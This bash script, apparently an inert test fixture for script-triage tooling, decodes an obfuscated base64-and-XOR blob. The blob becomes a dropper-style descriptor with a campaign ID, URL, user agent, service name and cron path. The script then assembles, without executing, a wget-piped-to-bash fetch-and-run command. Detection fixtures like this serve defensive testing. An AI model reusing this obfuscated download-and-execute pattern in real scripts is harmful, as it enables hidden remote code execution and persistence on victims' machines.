#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_0c10d955='24qJiIuB29uMiJbb2PXKytzLzdfM8YTN19ze2ObL3MrMxdHKl4uJ393a342Klt3Q1djP19CX3NXJ1NjB3JfbiomIi4Hb24yIlpaDysnNzdGE1cvMxduKiYiLgdvbjIiU197Q2MnU2NqE3dDm197Q2MnU2NrFiITN18zW2ubc3tjNysXcydDJ5s3M1t3NyubN3N7OhMvczcnY3djF3MnQyebR2s3YycrQ3ZXczdbU3Mvm3MvQzMja2ITKydzNysWIhM8='

readonly Codec_0c10d955='base64_literal|reverse_then_xor|b9'



Load_0c10d955() {

  e=()

  local p

  while read -r p; do [[ -n "$p" ]] && e+=("$p"); done < <(printf '%s' "${Material_0c10d955}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')

}



Decode_0c10d955() {

  d=()

  local i

  for ((i=0; i<${#e[@]}; i++)); do

    d[${#e[@]}-1-i]="$((e[i] ^ 185))"

  done

}



Recover_0c10d955() {

  local -a e d

  local t n z i

  n=$((19 * 7 - 133))

  Load_0c10d955

  local decode_target=Decode_0c10d955; "$decode_target"

  t=''

  local octal character

  for i in "${!d[@]}"; do

    printf -v octal '%03o' "${d[i]}"

    printf -v character '%b' "\\$octal"

    t+="$character"

  done

  printf '%s\n' "$t"

}



Inspect_0c10d955() { local recovered; recovered="$(Recover_0c10d955)"; printf '%s\n' "$recovered"; }



Plan_0c10d955() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_0c10d955)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(wget -qO- "$url")

  local -a interpreter=(bash -s)

  declare -p request_command interpreter

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_0c10d955; fi

